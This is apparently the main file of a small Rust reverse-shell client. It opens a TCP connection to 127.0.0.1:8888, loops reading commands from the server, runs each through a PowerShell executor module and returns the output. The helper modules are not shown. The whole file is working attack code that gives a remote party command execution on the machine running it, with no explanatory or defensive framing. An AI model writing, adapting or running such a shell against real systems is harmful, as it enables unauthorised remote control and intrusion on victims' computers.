mod power_shell_executor;
mod tcp_connector;


fn main() {
    let ip_address: String = String::from("127.0.0.1:8888");
    let mut command = power_shell_executor::get_executor();

    match tcp_connector::connect_to_ip_address(&ip_address)  {
        Ok(stream) => {
            loop {
                match tcp_connector::read_from_server(&stream) {
                    Ok(result_from_server) => {
                        println!("Got from server - {}", &result_from_server);
                        let result = power_shell_executor::execute(&mut command, &result_from_server);
                        tcp_connector::send_to_server(&stream, &result);
                    }
                    Err(_) => {
                    }
                }
            }
        }
        Err(e) => {
            println!("Failed to connect to {} - {}", ip_address, e)
        }
    }

    println!("Disconnected");
}
